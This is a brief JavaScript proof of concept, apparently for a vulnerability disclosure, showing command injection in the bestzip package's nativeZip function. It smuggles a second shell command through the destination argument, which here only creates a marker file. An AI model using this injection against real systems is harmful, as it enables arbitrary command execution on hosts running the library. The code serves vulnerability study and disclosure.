```javascript
const bestzip = require("./node_modules/bestzip");

// The `destination`/`source` values are concatenated, unsanitized, into a
// shell command string that is executed by cp.exec() inside nativeZip's
// `zipProcess` child process, allowing arbitrary command injection.
const maliciousDestination = "out.zip; touch /tmp/pwned_by_bestzip #";

bestzip
  .nativeZip({
    destination: maliciousDestination,
    source: "package.json",
    cwd: process.cwd()
  })
  .then(() => console.log("done"))
  .catch(() => {
    console.log("zipProcess ran (command may have exited non-zero), check /tmp/pwned_by_bestzip");
  });
```
